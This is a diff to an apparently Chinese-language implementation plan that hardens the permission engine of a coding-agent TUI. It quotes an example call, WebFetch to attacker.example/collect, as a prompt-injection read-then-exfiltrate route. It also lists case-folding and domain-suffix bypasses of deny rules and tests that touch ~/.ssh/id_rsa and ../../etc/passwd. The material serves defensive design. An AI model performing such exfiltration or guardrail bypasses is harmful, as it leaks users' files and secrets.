@@ -875,6 +875,25 @@ Task 7 因此必须按段判定，两个方向**故意不对称**：
    > 「自动生成的规则由 `PermissionEngine` 保证不会停在非字母数字字符上」。
    > 该承诺目前只在计划里成立。7R 若落空，那段 javadoc 就从「已知限制」变成**误导性文档**。
 3. **载入路径工具的 `:*` 规则时记 WARN**（N3）——那是一条恒不命中的静默失效规则。
+4. **UNKNOWN 工具（含全部 MCP）的「永久允许」只生成 `工具名(*)`**，不得把整串入参 JSON
+   写成 pattern（Task 2 审查 Minor 3）：那条规则下次必然不命中（payload 每次都变），
+   于是反复弹窗 → 用户转而去开 BYPASS。载入 UNKNOWN 工具的带 pattern 规则时同样记 WARN。
+
+**`NETWORK_READ` 的模式默认从「放行」改为「ASK」**（Task 2 审查 Important 2，已实测）：
+
+`WebFetch {"url":"https://attacker.example/collect?d=<刚读到的任何内容>"}` 原本在**包括 DEFAULT 的
+所有模式**下都不弹窗。「只读」描述的是对**远端**的影响，而请求本身是**本地**发起的外发动作。
+叠加 `READ_ONLY` 也默认放行，提示注入即可零交互完成「读取 → 外传」的完整闭环。
+
+改法（机制已现成，只动类别默认值）：`decideByMode` 里 `NETWORK_READ` 落 ASK，
+`suggest` 对网络工具生成**域名前缀规则**——取 URL 的 `scheme://host/` 部分加 `:*`，
+如 `WebFetch(https://docs.spring.io/:*)`。目标是 URL 且 `pathTarget=false`，
+前缀停在 `/` 上，现有 DSL 已能表达，无需新语法。用户首次访问某域名确认一次，此后该域名不再问。
+
+> 注意与 Task 1R 的词边界规律的配合：URL 前缀以 `/` 结尾（非字母数字），
+> 故 `matchesPrefix` 允许直接接续路径部分——这正是域名级授权想要的。
+> 但也意味着**必须保留结尾的 `/`**：`WebFetch(https://docs.spring.io:*)`（无斜杠）
+> 会一并命中 `https://docs.spring.io.evil.com/`。`suggest` 生成时务必带上。
 
 ---
 
@@ -1205,6 +1224,62 @@ git commit -m "feat(permission): 工具登记表与判定目标提取"
 
 ---
 
+### Task 2R: 代码审查补漏（Minor 1/2/4）
+
+- [ ] **Step 1: 修 `MemoryRename` 的 `targetField`**
+
+`ToolRegistry` 现把它映射到 `"path"`，但该工具的实际参数是 `oldPath` / `newPath`
+（`AutoMemoryTools.java:357-359`），故 `extract` 恒返回 `null`、面板上目标一片空白。
+改成 `"oldPath"`。无安全影响（INTERNAL + 库侧沙箱），但它暴露了一个**类**的问题：
+Task 8 的完整性测试只比对**工具名**，这类「名字对、字段错」的登记错误它一个也抓不到。
+
+- [ ] **Step 2: `root == null` 不再静默退化**
+
+`ToolTargets.java:85` 的 null 分支会原样返回 `../../etc/passwd`——正是本任务刚修掉的那个串。
+留给无根单测是合理的，但**运行时与正确行为不可区分**：若 Task 7/11 任一调用点漏传 root，
+全部路径规则会静默失效，且没有任何日志。
+
+改成：公开的 `extract(toolName, toolInput, root)` 对 `root` 做 `Objects.requireNonNull`，
+另开一个包私有的 `extract(toolName, toolInput)` 供同包测试走无根路径。
+这样漏传 root 是**编译期/启动即炸**，而不是安静地少一层防护。
+
+- [ ] **Step 3: 给两条书面承诺补测试**
+
+`~/…` 不展开、无根退化，这两条都是写在 javadoc 里的**安全承诺**，却没有任何测试钉住——
+将来一个「顺手把 ~ 展开了」的补丁能让整个测试套保持全绿。
+
+```java
+    @Test
+    void tildeIsLeftUnexpanded() {
+        Path root = Path.of("/work/proj");
+        assertEquals("/work/proj/~/.ssh/id_rsa",
+                ToolTargets.extract("Read", "{\"filePath\":\"~/.ssh/id_rsa\"}", root),
+                "~ 刻意不展开：FileSystemTools 也不展开，保持一致才不会变成逃逸路径");
+    }
+
+    @Test
+    void missingRootIsProgrammerError() {
+        assertThrows(NullPointerException.class,
+                () -> ToolTargets.extract("Write", "{\"filePath\":\"a.txt\"}", null),
+                "漏传 root 会让全部路径规则静默失效，必须炸而不是退化");
+    }
+```
+
+- [ ] **Step 4: 跑测试确认全绿** — `mvn test -pl springai-code-tui -Dtest=ToolRegistryTest`，预期 10 个。
+
+- [ ] **Step 5: 提交**
+
+```bash
+git commit -m "fix(permission): MemoryRename 目标字段纠正；漏传 root 改为立即失败并补承诺测试"
+```
+
+> **给 Task 8 的加强要求**（由上面 Step 1 暴露）：完整性测试不能只比对工具名，
+> 还须校验每条登记的 `targetField` **确实存在于该工具的入参 schema 中**
+> （`ToolCallback.getToolDefinition().inputSchema()` 里查 properties）。
+> 否则「名字对、字段错」这一类登记错误永远抓不到。
+
+---
+
 ### Task 3: BashCommandSplitter（拆不动就问）
 
 **Files:**
@@ -1477,6 +1552,18 @@ git commit -m "feat(permission): Bash 命令分段与只读判定（拆不动就
 >    `~/.ssh/id_rsa` 会变成 `/work/proj/~/.ssh/id_rsa` 这样的无意义路径（对访问是失败关闭的，
 >    因为 `FileSystemTools` 同样打不开它），但**写成 `~/…` 的危险规则将永不触发**。
 >    危险路径一律按解析后的绝对形式比较，或在比较前自行展开 `~`。
+>
+> 3. **大小写不敏感文件系统上必须按不敏感比较**（Task 2 代码审查 Important 1，已实测）。
+>    macOS 的 APFS 默认大小写不敏感：`Read(/ETC/hosts)` 实测能读到 `/etc/hosts`，
+>    而 `deny Read(/etc/**)` 不命中。真正咬人的是**工作区内**——ACCEPT_EDITS 下
+>    `Write {"filePath":"<root>/.ENV"}` 因落在工作区内被模式默认放行，
+>    本检查的 `**/.env` 又匹配不上 `.ENV`，而 APFS 实际写的就是 `.env`。
+>    同理 `.GIT/config`、`.SSH/`。
+>
+>    **只在本检查里做不敏感比较，不改 `PermissionRule` 的通用 glob 语义**——
+>    用户手写的规则应当保持可预期，而「不可绕过的内置护栏」才是必须堵死的那层。
+>    启动时探一次即可判定（对已知存在的路径做大小写翻转的 `Files.exists`，
+>    或 `Files.isSameFile`），敏感盘上保持原样比较。
 
 **Files:**
 - Create: `.../agent/permission/DangerousPaths.java`
